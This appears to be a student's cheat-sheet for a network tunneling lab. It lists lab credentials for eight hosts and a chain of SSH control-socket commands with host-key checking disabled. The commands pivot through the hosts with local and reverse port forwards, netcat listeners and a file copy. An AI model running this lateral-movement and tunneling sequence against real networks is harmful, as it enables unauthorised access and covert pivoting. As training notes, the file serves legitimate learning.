# Tops
## Module 0
- 17:ALL
- 18:-RSyntax
- 19:-LSyntax

## Module 1
### Creds
```
kali:root:toortoor!
40.0.0.101:bob:password1:22
40.0.0.102:bill:password15:5147
40.0.0.103:steve:password20:7892
40.0.0.104:alice:30password:2519
40.0.0.105:sarah:4password0:3659
40.0.0.106:beth:05password:9542
40.0.0.107:don:60password:8327
40.0.0.108:grace:password60:7428
```  
### Syntax
```bash
ssh -M -S /tmp/t1 -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null bob@40.0.0.101
ssh -S /tmp/t1 dum@127.0.0.1
scp -o ControlPath=/tmp/t1  bob@40.0.0.101:/home/bob/room/lp.py .
```
### Sockets
#### T1
```bash
ssh -M -S /tmp/t1 -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null bob@40.0.0.101
ssh -S /tmp/t1 dum@127.0.0.1
ssh -S /tmp/t1 dum@1 -O forward -R5157:127.0.0.1:4444
ssh -S /tmp/t1 dum@1 -O cancel -R5157:127.0.0.1:4444
ssh -S /tmp/t1 dum@1 -O forward -L10102:40.0.0.102.5147
```
#### T2
```bash
ssh -M -S /tmp/t2 -p 10102 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null bill@127.0.0.1
ssh -S /tmp/t2 dum@1
ssh -S /tmp/t2 dum@1 -O forward -R7902:127.0.0.1:4444
ssh -S /tmp/t2 dum@1 -O cancel -R7902:127.0.0.1:4444
ssh -S /tmp/t2 dum@1 -O forward -L10103:40.0.0.103:7892
```
#### T3
```bash
ssh -M -S /tmp/t3 -p 10103 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null steve@127.0.0.1
ssh -S /tmp/t3 dum@1
ssh -S /tmp/t3 dum@1 -O forward -R2529:127.0.0.1:4444
ssh -S /tmp/t3 dum@1 -O cancel -R2529:127.0.0.1:4444
ssh -S /tmp/t3 dum@1 -O forward -L10104:40.0.0.104:2519
```
#### T4
```bash
ssh -M -S /tmp/t4 -p 10104 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null alice@127.0.0.1
ssh -S /tmp/t4 dum@1
ssh -S /tmp/t4 dum@1 -O forward -R3669:127.0.0.1:4444
ssh -S /tmp/t4 dum@1 -O cancel -R3669:127.0.0.1:4444
ssh -S /tmp/t4 dum@1 -O forward -L10105:40.0.0.105:3659
```
#### T5
```bash
ssh -M -S /tmp/t5 -p 10105 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null sarah@127.0.0.1
ssh -S /tmp/t5 dum@1
kill -9 xxxx
nc -nlvp 9552
ssh -S /tmp/t5 dum@1 -O forward -L10106:40.0.0.106:9542
```
#### T6
```bash
ssh -M -S /tmp/t6 -p 10106 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null beth@127.0.0.1
ssh -S /tmp/t6 dum@1
kill -9 xxxx
nc -nlvp 8337
curl http://40.0.0.107:80   (listen 7438)
ssh -S /tmp/t6 dum@1 -O forward -L10107:40.0.0.107:8327
```
#### T7
```bash
ssh -M -S /tmp/t7 -p 10107 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null don@127.0.0.1
ssh -S /tmp/t7 dum@1
nc -nlvp 7438
ssh -S /tmp/t7 d@d -O forward -L10108:40.0.0.108:7428
```
#### T8
```bash
ssh -M -S /tmp/t8 -p 10108 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null grace@127.0.0.1
ssh -S /tmp/t8 d@d
ssh -S /tmp/t8 d@d -O forward -L 11108:127.0.0.1:80
curl http://127.0.0.1:11108
```
## Module 2
